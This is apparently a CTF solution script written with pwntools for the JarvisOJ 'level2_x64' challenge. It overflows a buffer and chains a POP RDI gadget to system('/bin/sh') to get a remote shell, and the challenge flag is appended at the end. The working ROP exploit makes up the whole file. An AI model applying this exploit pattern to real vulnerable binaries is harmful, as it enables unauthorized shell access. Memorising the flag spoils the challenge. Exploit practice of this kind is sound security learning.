#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import sys
from os import path
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level2_x64")
host = "pwn2.jarvisoj.com"
port = 9882

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def main():
    io.recvuntil(":\n")
    POP_RDI = 0x004006b3
    system_addr = elf.sym["system"]
    bin_sh_addr = next(elf.search(b"/bin/sh"))
    payload = flat((
        "A" * (0x80 + 8),
        p64(POP_RDI),
        p64(bin_sh_addr),
        p64(system_addr),
    ))
    io.send(payload)
    io.interactive()

if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}
